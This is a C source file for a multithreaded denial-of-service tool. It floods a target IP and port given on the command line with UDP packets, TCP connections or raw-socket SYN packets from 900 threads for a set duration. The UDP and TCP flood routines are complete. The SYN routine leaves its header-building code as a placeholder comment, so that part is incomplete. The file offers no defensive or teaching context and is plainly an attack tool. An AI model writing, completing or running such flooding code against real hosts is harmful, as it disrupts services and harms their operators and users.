#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

#define MAX_PACKET_SIZE 4096
#define THREADS 900
#define DEFAULT_DURATION 180

typedef struct {
    char *ip;
    int port;
    int duration;
    char *method;
    int packet_size;
    int packets_per_sec;
} AttackParams;

volatile int running = 1;

// UDP Flood Attack
void* udp_flood(void *args) {
    AttackParams *params = (AttackParams*)args;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        perror("Socket error");
        return NULL;
    }

    struct sockaddr_in servaddr;
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &servaddr.sin_addr);

    char buffer[MAX_PACKET_SIZE];
    memset(buffer, rand()%256, MAX_PACKET_SIZE);

    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = (1000000000/params->packets_per_sec);

    while(running) {
        sendto(sockfd, buffer, params->packet_size, 0, 
              (struct sockaddr*)&servaddr, sizeof(servaddr));
        nanosleep(&ts, NULL);
    }
    close(sockfd);
    return NULL;
}

// TCP Flood Attack
void* tcp_flood(void *args) {
    AttackParams *params = (AttackParams*)args;
    int sockfd;
    struct sockaddr_in servaddr;

    while(running) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(sockfd < 0) continue;

        memset(&servaddr, 0, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(params->port);
        inet_pton(AF_INET, params->ip, &servaddr.sin_addr);

        if(connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) == 0) {
            char buffer[MAX_PACKET_SIZE];
            memset(buffer, rand()%256, MAX_PACKET_SIZE);
            send(sockfd, buffer, params->packet_size, 0);
        }
        close(sockfd);
    }
    return NULL;
}

// SYN Flood Attack
void* syn_flood(void *args) {
    AttackParams *params = (AttackParams*)args;
    char buffer[MAX_PACKET_SIZE];
    struct sockaddr_in servaddr;
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &servaddr.sin_addr);

    while(running) {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(sockfd < 0) continue;
        
        // Custom TCP SYN packet creation
        // [TCP header manipulation code here]
        
        sendto(sockfd, buffer, sizeof(buffer), 0,
              (struct sockaddr*)&servaddr, sizeof(servaddr));
        close(sockfd);
    }
    return NULL;
}

void attack_controller(AttackParams *params) {
    pthread_t threads[THREADS];
    void* (*attack_func)(void*) = NULL;

    if(strcmp(params->method, "UDP") == 0) attack_func = udp_flood;
    else if(strcmp(params->method, "TCP") == 0) attack_func = tcp_flood;
    else if(strcmp(params->method, "SYN") == 0) attack_func = syn_flood;
    else {
        fprintf(stderr, "Invalid attack method\n");
        return;
    }

    for(int i=0; i<THREADS; i++) {
        pthread_create(&threads[i], NULL, attack_func, params);
    }

    sleep(params->duration);
    running = 0;

    for(int i=0; i<THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
}

int main(int argc, char *argv[]) {
    if(argc < 5) {
        printf("Usage: %s <IP> <PORT> <METHOD> <DURATION>\n", argv[0]);
        exit(1);
    }

    AttackParams params;
    params.ip = argv[1];
    params.port = atoi(argv[2]);
    params.method = argv[3];
    params.duration = atoi(argv[4]);
    params.packet_size = 1024;  // Customizable
    params.packets_per_sec = 1000; // Packets per second per thread

    // Validate IP address
    struct sockaddr_in sa;
    if(inet_pton(AF_INET, params.ip, &(sa.sin_addr)) == 0) {
        fprintf(stderr, "Invalid IP address\n");
        exit(1);
    }

    printf("🚀 Starting %s attack on %s:%d for %d seconds\n", 
          params.method, params.ip, params.port, params.duration);
    
    attack_controller(&params);
    
    printf("✅ Attack completed successfully\n");
    return 0;
}
